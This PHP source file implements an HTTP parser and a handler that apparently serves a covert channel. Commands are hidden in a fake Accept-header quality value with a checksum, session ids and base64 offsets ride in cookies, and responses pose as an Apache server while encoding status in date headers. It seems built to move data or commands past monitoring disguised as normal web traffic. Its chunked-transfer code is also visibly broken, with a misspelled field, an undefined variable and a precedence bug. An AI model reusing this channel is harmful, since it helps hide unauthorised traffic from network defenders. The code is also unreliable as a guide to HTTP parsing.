<?php

class module_protocol_http_parser {

	public $method ;
	public $version ;
	public $uri ;
	public $query ;
	public $path ;
	public $fragment ;

	public $headers = NULL ;
	public $headers_lc = NULL ;
	public $content_length = 0 ;
	public $headers_length = 0 ;

	public $state = 0 ;

	const STATE_HEADERS = 0 ;
	const STATE_BODY = 1 ;
	const STATE_EOF = 2 ;

	private $buffer = NULL ;
	public $stream ;
	public $filter ;
	private $stream_length = 0 ;

	private $is_chunked = false ;
	private $chunk_state = 0 ;
    private $chunk_len = 0 ;
    private $chunk_trail = 0 ;
    private $chunk_buffer = NULL ;

	const STATE_CHUNK_HEADER = 0 ;
    const STATE_CHUNK_DATA = 1 ;
    const STATE_CHUNK_TRAIL = 2 ;

	public function __construct() {

		$this->state = self::STATE_HEADERS ;
		$this->stream = fopen("php://memory", 'r+b') ;
	}

	public function __destruct() {

		if (is_resource($this->filter))
			stream_filter_remove($this->filter) ;

		fclose($this->stream) ;
		unset($this->stream) ;

	}

	public function release() {

		$this->buffer = NULL ;
		$this->__destruct() ;
		$this->__construct() ;

	}

	public function parse_headers($data) {
		$arr = explode("\n", $data) ;

		$headers = array() ;
		$overwrite = true ;

		foreach($arr as $item) {			$header_arr = explode(": ", trim($item), 2) ;
			if (is_array($header_arr) && (sizeof($header_arr) == 2)) {				list($name, $value) = $header_arr ;

				if ($overwrite || !isset($headers[$name]))
					$headers[$name] = $value ;
			}
		}

		return $headers ;
	}

	public function parse_data($data) {
		switch($this->state) {
			case self::STATE_HEADERS:
   				$buf = &$this->buffer ;
   				$buf_offset = strlen($buf) ;
   				$buf.= $data ;
   				$this->stream_length = 0 ;

   				if (($eoh_pos = strpos($buf, "\r\n\r\n", $buf_offset)) === false)
					break ;

				$this->headers_length = $eoh_pos + 4 ;

				$erq_pos = strpos($buf, "\r\n") + 2 ;
				$request_line = substr($buf, 0, $erq_pos) ;
				$request_parts = explode(" ", $request_line, 3) ;

				$this->method = $request_parts[0] ;
				$this->uri = $request_parts[1] ;
				$this->version = $request_parts[2] ;

				$uri_arr = parse_url($this->uri) ;
				$this->query = isset($uri_arr['query'])?$uri_arr['query']:NULL ;
				$this->path = isset($uri_arr['path'])?$uri_arr['path']:NULL ;
				$this->fragment = isset($uri_arr['fragment'])?$uri_arr['fragment']:NULL ;

				$headers_data = substr($buf, $erq_pos, $eoh_pos - $erq_pos) ;

				$this->headers = $this->parse_headers($headers_data) ;

				$this->content_length = 0 ;
				foreach($this->headers as $key=>$val) {					$this->headers_lc[strtolower($key)] = $val ;
					if (strtolower($key) == 'content-length') {
						$this->content_length = $val ;
					} elseif (strtolower($key) == 'transfer-encoding') {
						$this->is_chunked = true ;

						unset($this->headers[$key]) ;
						$this->content_length = 0 ;
						break ;
					}

				}

				$data = substr($buf, $eoh_pos + 4) ;

				$this->state = self::STATE_BODY ;

			case self::STATE_BODY:

				if ($this->is_chunked) {
					$this->parse_chunk_data($data) ;

				} else {

					fseek($this->stream, $this->stream_length) ;
					fwrite($this->stream, $data) ;
					$this->stream_length+= strlen($data) ;

					if ($this->stream_length >= $this->content_length) {
						$this->state = self::STATE_EOF ;
					}
				}

			case self::STATE_EOF:
				fseek($this->stream, 0) ;
			break ;

		}

		return ($this->state == self::STATE_EOF) ;
	}


	private function parse_chunk_data($data) {

        $stream = &$this->stream ;
        $buf = &$this->chunk_buffer ;

        $len = &$this->chunk_len ;
        $trail = &$this->chunk_trail ;
        $state = &$this->chunk_state ;

		while ($data) {

            switch ($state) {
            	case self::STATE_CHUNK_HEADER:

					$buf.= $data ;
					$data = NULL ;

					if ($ech = strpos($buf, "\r\n") === false)
						break ;

					$header = substr($buf, 0, $ech) ;

					list($len_hex) = explode(';', $header, 2) ;
					$len = intval($len_hex, 16) ;

					$state = self::STATE_CHUNK_DATA ;

					$data = substr($buf, $ech + 2) ;
		            $buf = NULL ;

					if ($len == 0) {
						$this->state = self::STATE_EOF ;
						$this->headers['Content-Length'] = $this->content_length ;
						return true ;
					}

				case self::STATE_CHUNK_DATA:

	         		$body = (strlen($data) > $len)?substr($data, 0, $len):$data ;
					$this->content_lenhgth+= strlen($body) ;

					fwrite($stream, $body);

					$data = substr($data, $chunk_len_remaining) ;
					$len-= strlen($body) ;

					if ($chunk_len_remaining == 0) {
	                        $trail = 2 ;
	                        $state = self::STATE_CHUNK_TRAIL ;
	                }
				break ;

				case self::STATE_CHUNK_TRAIL:

					$read_len = min(strlen($data), $chunk_trail) ;

					$data = substr($data, $read_len) ;
					$trail-= $read_len ;

					if ($trail == 0)
	                	$chunk_state = static::STATE_CHUNK_HEADER ;

	             break ;
	        }
        }

	}

}

class module_protocol_http_composter {

	private $status_code ;
	private $headers ;
	private $body ;


	public function __construct() {
	}

	public function __destruct() {
	}

	public function response($status_code, $data = NULL, $headers = NULL) {

		$this->status_code = $status_code ;
		$this->headers = $headers ;
        $this->body = $data ;

		return $this->output() ;
	}

	private function output() {		ob_start() ;
		printf ("HTTP/1.1 %s %s\r\n", $this->status_code, self::$status_msgs[$this->status_code]) ;
		if (is_array($this->headers))
		foreach($this->headers as $key => $value)
			printf("%s: %s\r\n", $key, $value) ;

		echo "\r\n" ;

		echo $this->body ;

        return ob_get_clean() ;
	}

	static $status_msgs = array(
        100 => 'Continue',
        101 => 'Switching Protocols',
        200 => 'OK',
        201 => 'Created',
        202 => 'Accepted',
        203 => 'Non-Authoritative Information',
        204 => 'No Content',
        205 => 'Reset Content',
        206 => 'Partial Content',
        300 => 'Multiple Choices',
        301 => 'Moved Permanently',
        302 => 'Found',
        303 => 'See Other',
        304 => 'Not Modified',
        305 => 'Use Proxy',
        307 => 'Temporary Redirect',
        400 => 'Bad Request',
        401 => 'Unauthorized',
        402 => 'Payment Required',
        403 => 'Forbidden',
        404 => 'Not Found',
        405 => 'Method Not Allowed',
        406 => 'Not Acceptable',
        407 => 'Proxy Authentication Required',
        408 => 'Request Timeout',
        409 => 'Conflict',
        410 => 'Gone',
        411 => 'Length Required',
        412 => 'Precondition Failed',
        413 => 'Request Entity Too Large',
        414 => 'Request-URI Too Long',
        415 => 'Unsupported Media Type',
        416 => 'Requested Range Not Satisfiable',
        417 => 'Expectation Failed',
        500 => 'Internal Server Error',
        501 => 'Not Implemented',
        502 => 'Bad Gateway',
        503 => 'Service Unavailable',
        504 => 'Gateway Timeout',
        505 => 'HTTP Version Not Supported',
    ) ;

}

class module_protocol_http_messager {
	const CMD_HEARTBEAT = 9 ;
	const CMD_READ = 3 ;
	const CMD_READ_COMPLETE = 4 ;
	const CMD_PREPARE = 6 ;
	const CMD_WRITE = 7 ;
	const CMD_WRITE_COMPLETE = 8 ;

	const MODE_RAW = 1 ;
	const MODE_BASE64 = 2 ;
	const MODE_JPEG = 4 ;

	const BUFFER_SIZE = 65535 ;

	private $metadata = NULL ;
	private $command = NULL ;
	private $offset = NULL ;
	private $len = NULL ;
	private $mode = NULL ;
	public $buffer = NULL ;
	private $data = NULL ;

	public function parse(&$parser, &$handler) {
		$headers = &$parser->headers_lc ;

		$method = $parser->method ;
		$resource = $parser->uri ;
		$hostname = arr::get($headers, 'host') ;
		$accept = arr::get($headers, 'accept') ;
		$this->data = null ;

		if (($chs = strpos($accept, 'q=0.')) === false)
			return false ;

		if (($che = strpos($accept, ', ', $chs + 4)) === false)
			return false ;

		if (($cms = strpos($accept, '/xml;q=0.', $che + 2)) === false)
			return false ;

		$checksum = substr($accept, $chs + 4, $che - $chs - 4) ;
		$this->command = substr($accept, $cms + 9) ;

		if ($checksum != strlen($resource) % 10)
			return false ;

		$cookie = arr::get($headers, 'cookie') ;

		$cookies = array() ;
		$cookie_parts = explode(';', $cookie) ;
		foreach($cookie_parts as $part) {			if ($part = trim($part))				if (($s = strpos($part, '=')) !== false) {					$key = trim(substr($part, 0, $s)) ;
					$val = trim(substr($part, $s + 1)) ;
					$cookies[$key] = $val ;
				}
		}

		if (!isset($cookies['meta']))
			return false ;

		$this->metadata = arr::get($cookies, 'meta') ;
		$this->mode = arr::get($cookies, 'md') ;

		if ($this->mode == self::MODE_BASE64)
			$parser->filter = stream_filter_append($parser->stream, 'convert.base64-decode') ;

		if (!preg_match('/^[0-9A-F]{32}$/', $this->metadata))
			return false ;

		$params = null ;
		$this->buffer = null ;

		if (($this->command == self::CMD_READ || $this->command == self::CMD_WRITE)) {

  			if (isset($cookies['ofs']) && isset($cookies['len'])) {
				$this->offset = base64_decode(arr::get($cookies, 'ofs')) ;
				$this->len = base64_decode(arr::get($cookies, 'len')) ;
			} else return false ;

		}

		if ($this->command == self::CMD_PREPARE) {

			if ($cookies['len']) {
				$this->len = base64_decode($cookies['len']) ;
			} else return false ;

		}

		switch($this->command) {

			case self::CMD_HEARTBEAT:
				$this->len = $handler->heartbeat($this->metadata) ;
				return true ;
			break ;

			case self::CMD_READ:
				$this->data = $handler->read($this->metadata, $this->offset, $this->len, $this->mode) ;
				return true ;
			break ;

			case self::CMD_READ_COMPLETE:
				$handler->read_complete($this->metadata) ;
				return true ;
			break ;

			case self::CMD_PREPARE:
				$handler->prepare($this->metadata, $this->len) ;
				return true ;
			break ;

			case self::CMD_WRITE:

				fseek($parser->stream, 0) ;
				$readed = 0 ;
				$buf_readed = 0 ;
				$buf_offset = 0 ;

				while($readed < $parser->content_length) {

					$buf_len = min($parser->content_length - $readed, self::BUFFER_SIZE) ;
					$buf = fread($parser->stream, $buf_len) ;

					$buf_readed+= strlen($buf) ;

					$result = $handler->write($this->metadata, $this->offset + $buf_offset, $buf_readed, $buf) ;

					$buf_offset = 0 ;

					$readed+= $buf_len ;
				}

				return true ;
			break ;

			case self::CMD_WRITE_COMPLETE:
				$handler->write_complete($this->metadata) ;
				return true ;
			break ;

		}

		return false ;
	}

	public function compose(&$composter) {

		$headers = array(
			'Server' => 'Apache/2.4'
		) ;

 		$len = strlen($this->data) ;

		if ($len)
			$headers['Content-Length'] = $len ;

		switch($this->command) {

			case self::CMD_HEARTBEAT:

				if ($this->len) {                	$headers['Expires'] = gmdate('D, d M Y H:i:s T', time()) ;
                	$headers['Last-Modified'] = gmdate('D, d M Y H:i:s T', time() - $this->len) ;
				}

			break ;
		}

		//$headers['Connection'] = 'close' ;

		if ($this->mode == self::MODE_BASE64) {
			$this->data = base64_encode($this->data) ;
			$headers['Content-Length'] = strlen($this->data) ;
		}



		return $composter->response('200', $this->data, $headers) ;
	}

}

class module_protocol_http {
	private $handler ;
	private $parser ;
	private $composter ;
	private $messager ;

	public function __construct(&$handler = null) {
		$this->handler = $handler ;

		$this->parser = new module_protocol_http_parser() ;
		$this->composter = new module_protocol_http_composter() ;
		$this->messager = new module_protocol_http_messager() ;

		//parent::__construct() ;
	}

	public function __destruct() {
		unset($this->parser) ;
		unset($this->composter) ;
		unset($this->messager) ;

		//parent::__destruct() ;
	}

	public function data_begin($client) {

		printf("connect %s:%s\n", $client->ip, $client->port) ;

  		return true ;
	}

	public function data_process(&$client) {

		$buffer = &$client->buffer ;

		if ($this->parser->parse_data($buffer)) {

  			if ($this->messager->parse($this->parser, $this->handler)) {
            	$client->write($this->messager->compose($this->composter)) ;
 			} else $client->write($this->composter->response('500')) ;



			$client->buffer_flush() ;
			if (isset($this->parser->headers_lc['connection']) && strtolower($this->parser->headers_lc['connection']) == 'close')
				$client->destroy() ;


			//$client->destroy() ;
			$this->parser->release() ;
		}
		$client->buffer_flush() ;

  		return true ;
	}

	public function data_end($client) {
		printf("disconnect %s:%s\n", $client->ip, $client->port) ;

		//return $this->data_process($client) ;
	}


}


?>